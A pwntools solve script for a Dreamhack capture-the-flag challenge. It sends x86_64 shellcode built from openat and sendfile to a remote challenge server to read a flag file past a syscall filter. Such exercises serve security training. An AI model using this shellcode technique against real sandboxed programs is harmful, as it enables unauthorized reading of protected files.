from pwn import *

context.arch = "x86_64"

#p = process("./bypass_syscall")
p = remote("host3.dreamhack.games", 20413)
shellcode = shellcraft.openat(0, "/home/bypass_syscall/flag")
shellcode += "mov r10, 0xffff"
shellcode += shellcraft.sendfile(1, "rax", 0).replace("xor r10d, r10d", "")
shellcode += shellcraft.exit(0)
print(shellcode)
shellcode = asm(shellcode)
p.sendafter(b"shellcode: ", shellcode)

p.interactive()
